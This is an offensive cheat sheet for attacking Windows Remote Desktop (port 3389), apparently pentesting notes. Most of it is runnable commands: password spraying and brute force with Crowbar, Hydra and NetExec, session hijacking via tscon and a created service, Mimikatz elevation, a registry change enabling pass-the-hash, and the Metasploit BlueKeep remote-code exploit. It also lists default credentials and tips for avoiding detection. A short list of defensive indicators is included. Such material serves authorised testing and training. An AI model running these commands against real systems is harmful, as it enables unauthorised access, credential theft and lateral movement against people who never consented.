# RDP Enumeration (Port 3389)

Enumerate Remote Desktop Protocol to identify encryption settings, vulnerabilities, and valid credentials.
RDP provides direct GUI access to Windows systems and is a prime target for credential attacks and exploitation.

## Quick Reference

```bash
# Nmap RDP enumeration
nmap -p 3389 --script rdp-enum-encryption,rdp-ntlm-info 10.10.10.10

# Connect with xfreerdp
xfreerdp /u:admin /p:password /v:10.10.10.10

# Password spray with Crowbar
crowbar -b rdp -s 10.10.10.10/32 -U users.txt -c 'Password123!'
```

## Nmap NSE Scripts

```bash
# RDP encryption enumeration
nmap -p 3389 --script rdp-enum-encryption 10.10.10.10

# NTLM information disclosure
nmap -p 3389 --script rdp-ntlm-info 10.10.10.10

# Check for MS12-020 vulnerability
nmap -p 3389 --script rdp-vuln-ms12-020 10.10.10.10

# All RDP scripts
nmap -p 3389 --script "rdp-*" 10.10.10.10
```

## Connecting to RDP

### Linux

```bash
# xfreerdp
xfreerdp /u:admin /p:password /v:10.10.10.10
xfreerdp /u:admin /p:password /v:10.10.10.10 /cert-ignore

# With domain
xfreerdp /u:admin /p:password /d:domain.local /v:10.10.10.10

# Full screen
xfreerdp /u:admin /p:password /v:10.10.10.10 /f

# Specific resolution
xfreerdp /u:admin /p:password /v:10.10.10.10 /w:1920 /h:1080

# rdesktop
rdesktop -u admin -p password 10.10.10.10

# Remmina (GUI)
remmina
```

### Windows

```cmd
# mstsc (GUI)
mstsc /v:10.10.10.10

# With saved credentials
mstsc /v:10.10.10.10 /admin
```

## Password Attacks

### Crowbar

```bash
# Single target
crowbar -b rdp -s 10.10.10.10/32 -U users.txt -c 'Password123!'

# Multiple targets
crowbar -b rdp -s 10.10.10.0/24 -U users.txt -c 'Password123!'

# With password list
crowbar -b rdp -s 10.10.10.10/32 -U users.txt -C passwords.txt
```

### Hydra

```bash
# Password spray
hydra -L users.txt -p 'Password123!' rdp://10.10.10.10

# Brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10

# With domain
hydra -L users.txt -p 'Password123!' rdp://10.10.10.10/domain.local
```

### NetExec

```bash
# Check RDP access
nxc rdp 10.10.10.10 -u admin -p password

# Password spray
nxc rdp 10.10.10.0/24 -u users.txt -p 'Password123!'

# Check for admin access
nxc rdp 10.10.10.10 -u admin -p password --local-auth
```

## RDP Session Hijacking

### Prerequisites
- SYSTEM privileges on target
- Another user logged in via RDP

### Enumerate Sessions

```cmd
# Query logged-in users
query user

# Example output:
# USERNAME    SESSIONNAME  ID  STATE   IDLE TIME  LOGON TIME
# admin       rdp-tcp#0    1   Active  .          1/1/2024 10:00 AM
# user        rdp-tcp#1    2   Active  5          1/1/2024 11:00 AM
```

### Hijack Session (Pre-Server 2019)

```cmd
# Create service to hijack session
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#0"

# Start service
net start sessionhijack

# Alternative: Direct tscon (requires SYSTEM)
tscon 2 /dest:rdp-tcp#0
```

### Get SYSTEM Privileges

```cmd
# Using PsExec
PsExec.exe -s cmd.exe

# Using Mimikatz
privilege::debug
token::elevate
```

## Pass-the-Hash

### Enable Restricted Admin Mode

```cmd
# Add registry key
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

### Connect with Hash

```bash
# xfreerdp with PTH
xfreerdp /u:admin /pth:NTHASH /v:10.10.10.10

# With domain
xfreerdp /u:admin /pth:NTHASH /d:domain.local /v:10.10.10.10
```

## BlueKeep (CVE-2019-0708)

### Check for Vulnerability

```bash
# Nmap
nmap -p 3389 --script rdp-vuln-ms12-020 10.10.10.10

# Metasploit scanner
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS 10.10.10.10
run
```

### Exploitation

```bash
# Metasploit (use with caution - can cause BSoD)
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 10.10.10.10
set TARGET 2  # Windows 7 x64
run
```

## Common Workflow

```bash
# Step 1: Enumerate RDP
nmap -p 3389 --script rdp-enum-encryption,rdp-ntlm-info 10.10.10.10

# Step 2: Check for BlueKeep
nmap -p 3389 --script rdp-vuln-ms12-020 10.10.10.10

# Step 3: Try default credentials
xfreerdp /u:administrator /p:password /v:10.10.10.10

# Step 4: Password spray
crowbar -b rdp -s 10.10.10.10/32 -U users.txt -c 'Password123!'

# Step 5: If credentials found, connect
xfreerdp /u:admin /p:found_password /v:10.10.10.10
```

## Notes

**RDP Encryption Levels:**

- **None**: No encryption (very rare)
- **Low**: 56-bit encryption
- **Client Compatible**: Highest supported by client
- **High**: 128-bit encryption
- **FIPS**: FIPS 140-1 compliant

**Network Level Authentication (NLA):**

- Requires authentication before RDP session
- More secure than legacy RDP
- Can prevent some attacks
- Check with: `rdp-enum-encryption` script

**Common Default Credentials:**

- administrator:administrator
- admin:admin
- administrator:password
- admin:password123

**RDP Vulnerabilities:**

- **CVE-2019-0708 (BlueKeep)**: RCE, affects Windows 7/2008
- **CVE-2019-1181/1182 (DejaBlue)**: RCE, affects Windows 7/2008/2012
- **CVE-2012-0002 (MS12-020)**: DoS vulnerability

**Session Hijacking Notes:**

- Requires SYSTEM privileges
- Works on Server 2016 and earlier
- Patched in Server 2019
- Can hijack without knowing user's password
- Leaves minimal forensic evidence

**Restricted Admin Mode:**

- Allows PTH attacks
- Must be enabled via registry
- Credentials not sent to remote system
- Useful for lateral movement

**Best Practices:**

- Always check for NLA status
- Test for BlueKeep on older systems
- Use password spraying over brute force
- Check account lockout policy first
- Monitor for failed login attempts
- Consider time of day for attacks

**Defensive Indicators:**

- Multiple failed login attempts
- Connections from unusual IPs
- Connections outside business hours
- Session hijacking leaves event logs
- PTH attempts may trigger alerts

**Port Variations:**

- 3389: Default RDP port
- 3388: Alternative RDP port
- Custom ports: Check with Nmap scan
